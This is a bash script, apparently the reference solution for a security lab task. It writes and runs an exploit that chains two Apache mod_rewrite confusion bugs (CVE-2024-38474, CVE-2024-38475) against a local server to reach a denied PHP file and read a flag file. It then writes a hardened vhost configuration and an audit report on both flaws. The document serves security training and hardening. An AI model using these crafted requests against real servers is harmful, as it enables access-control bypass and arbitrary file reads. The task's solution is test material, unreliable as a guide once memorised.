#!/bin/bash

# === Phase 1: Exploit ===

# Start services and wait for readiness
bash /app/setup.sh
sleep 3

for attempt in $(seq 1 10); do
    if curl -s -o /dev/null http://localhost/ 2>/dev/null; then break; fi
    sleep 2
done

# Create the exploit script
cat > /app/exploit.sh << 'EXPLOIT_SCRIPT'
#!/bin/bash
# Apache Confusion Attack Chain Exploit
# Chains Filename Confusion (ACL bypass) + DocumentRoot Confusion (filesystem escape)

bash /app/setup.sh 2>/dev/null
sleep 2

for i in $(seq 1 15); do
    if curl -s -o /dev/null http://localhost/ 2>/dev/null; then break; fi
    sleep 2
done

# Step 1: Filename Confusion ACL Bypass (CVE-2024-38474)
# The %3F (URL-encoded ?) makes r->filename = "credentials.php?x.php"
# This does NOT match <Files "credentials.php">, bypassing Require all denied.
# However <FilesMatch "\.php$"> matches, so PHP-FPM processes it.
# PHP-FPM truncates at the ? and executes credentials.php.
echo "[*] Step 1: Filename Confusion ACL Bypass"
CREDS=$(curl -s --path-as-is --max-time 15 "http://localhost/credentials.php%3Fx.php")
echo "$CREDS"

# Step 2: DocumentRoot Confusion (CVE-2024-38475)
# RewriteRule "^/resources/(.*)$" "/$1.html" substitutes to an absolute path.
# mod_rewrite's splitout_queryargs() decodes %3F to ? and truncates the .html suffix.
# prefix_stat() finds /usr/share/doc/webapp-utils/tools/reader.php on disk,
# so Apache serves it directly without prepending DocumentRoot.
# The [QSA] flag passes our query string (?f=...) to the PHP gadget.
echo "[*] Step 2: DocumentRoot Confusion + File Read"
FLAG=$(curl -s --path-as-is --max-time 15 \
    "http://localhost/resources/usr/share/doc/webapp-utils/tools/reader.php%3F?f=/var/secret/flag.txt")
echo "[*] Flag: $FLAG"

if [ -n "$FLAG" ]; then
    echo "$FLAG" > /app/flag.txt
fi
EXPLOIT_SCRIPT

chmod +x /app/exploit.sh

# Execute the exploit
bash /app/exploit.sh

# === Phase 2: Hardened Configuration ===

cat > /app/hardened_vhost.conf << 'HARDENED_CONFIG'
<VirtualHost *:80>
    ServerName localhost
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>

    # FIXED (CVE-2024-38475): Restrict RewriteRule capture to safe characters
    # and anchor substitution to DocumentRoot. The original rule
    #   RewriteRule "^/resources/(.*)$" "/$1.html" [QSA]
    # allowed arbitrary path injection because (.*) captures path separators
    # and the substitution /$1.html is an absolute path. With %3F, mod_rewrite
    # truncates the .html suffix, and prefix_stat finds the file outside
    # DocumentRoot. Fix: only allow simple filenames in the capture group.
    RewriteEngine On
    RewriteRule "^/resources/([a-zA-Z0-9_.-]+)$" "/var/www/html/resources/$1.html" [QSA]

    # PHP processing via FPM (TCP connection)
    <FilesMatch "\.php$">
        SetHandler "proxy:fcgi://127.0.0.1:9000"
    </FilesMatch>

    # FIXED (CVE-2024-38474): Use LocationMatch instead of Files for access
    # control. The original <Files "credentials.php"> checks against r->filename
    # which can be confused by %3F encoding — the decoded filename
    # "credentials.php?x.php" no longer matches the Files pattern. LocationMatch
    # operates on the URL path and is immune to this confusion.
    <LocationMatch "credentials\.php">
        Require all denied
    </LocationMatch>

    DirectoryIndex index.html index.php
</VirtualHost>
HARDENED_CONFIG

# === Phase 3: Audit Report ===

cat > /app/audit_report.txt << 'AUDIT_REPORT'
Apache HTTP Server 2.4.59 Confusion Attack Vulnerability Audit
==============================================================

Vulnerability 1: Filename Confusion — ACL Bypass
-------------------------------------------------
Attack Primitive: URL-encoded question mark (%3F) in the request path causes
r->filename to contain a literal '?' character after URL decoding. The <Files>
directive performs basename matching against the confused filename, and the
pattern "credentials.php" does not match "credentials.php?x.php", so the
access control (Require all denied) is bypassed. Meanwhile, <FilesMatch "\.php$">
still matches because the filename ends with ".php", causing the PHP-FPM handler
to be invoked. PHP-FPM interprets the '?' as a query separator and truncates,
executing the original credentials.php file — completely bypassing the intended
access restriction.

Affected Directive: <Files "credentials.php"> with Require all denied
CVE: CVE-2024-38474 (substitution encoding issue in mod_rewrite / filename confusion)

Mitigation: Replaced <Files "credentials.php"> with <LocationMatch "credentials\.php">
which performs URL-path matching instead of r->filename matching. LocationMatch is
immune to the filename confusion because it operates before filename resolution.

Vulnerability 2: DocumentRoot Confusion — Filesystem Escape
------------------------------------------------------------
Attack Primitive: The RewriteRule substitution "/$1.html" starts with '/' making
it an absolute filesystem path rather than a path relative to DocumentRoot. When
user input containing %3F is captured by the (.*) group, mod_rewrite's internal
splitout_queryargs() function decodes %3F to '?' and truncates everything after
it (removing the .html suffix). Apache's prefix_stat() then checks if the
resulting absolute path exists on the real filesystem. If it does (e.g.,
/usr/share/doc/webapp-utils/tools/reader.php), Apache serves it directly,
completely bypassing the DocumentRoot boundary. Combined with a PHP gadget that
reads arbitrary files, this enables reading any file accessible to www-data.

Affected Directive: RewriteRule "^/resources/(.*)$" "/$1.html" [QSA]
CVE: CVE-2024-38475 (improper escaping of output in mod_rewrite / DocumentRoot escape)

Mitigation: Restricted the capture group from (.*) to ([a-zA-Z0-9_.-]+) which
prevents path separators, percent-encoded characters, and directory traversal.
Additionally anchored the substitution to DocumentRoot (/var/www/html/resources/$1.html)
so even if the capture were bypassed, the result stays within the web root.

Additional Context: CVE-2024-38476 covers the broader exploitation surface where
internal redirects from DocumentRoot confusion can reach server-side scripts
(CGI, PHP) that act as gadgets for further exploitation (SSRF, LFI, RCE). All
three CVEs were fixed in Apache HTTP Server 2.4.60.
AUDIT_REPORT
